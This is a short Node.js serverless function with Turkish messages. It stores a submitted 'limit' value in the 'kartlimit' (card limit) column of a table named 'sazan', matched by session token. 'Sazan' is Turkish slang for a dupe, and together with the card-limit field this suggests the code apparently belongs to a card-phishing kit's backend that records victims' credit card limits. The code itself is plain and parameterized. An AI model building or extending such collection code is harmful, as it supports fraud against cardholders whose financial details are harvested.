const { query } = require('../../lib/db');
const { getSessionToken } = require('../../lib/session');

exports.handler = async function handler(event) {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ message: 'Yalnızca POST desteklenir.' }) };
  }

  try {
    const sessionToken = getSessionToken(event.headers);
    if (!sessionToken) {
      return { statusCode: 401, body: JSON.stringify({ message: 'Oturum bulunamadı.' }) };
    }

    const body = JSON.parse(event.body || '{}');
    const limitValue = (body?.limit ?? '').toString().trim();

    if (!limitValue) {
      return { statusCode: 400, body: JSON.stringify({ message: 'Limit değeri boş olamaz.' }) };
    }

    const result = await query('UPDATE sazan SET kartlimit = $1 WHERE session_token = $2 RETURNING id', [limitValue, sessionToken]);
    if (!result.rowCount) {
      return { statusCode: 404, body: JSON.stringify({ message: 'Kayıt bulunamadı.' }) };
    }

    return { statusCode: 200, body: JSON.stringify({ ok: true }) };
  } catch (error) {
    console.error('submit-limit hatası:', error);
    return { statusCode: 500, body: JSON.stringify({ message: 'Beklenmeyen hata.' }) };
  }
};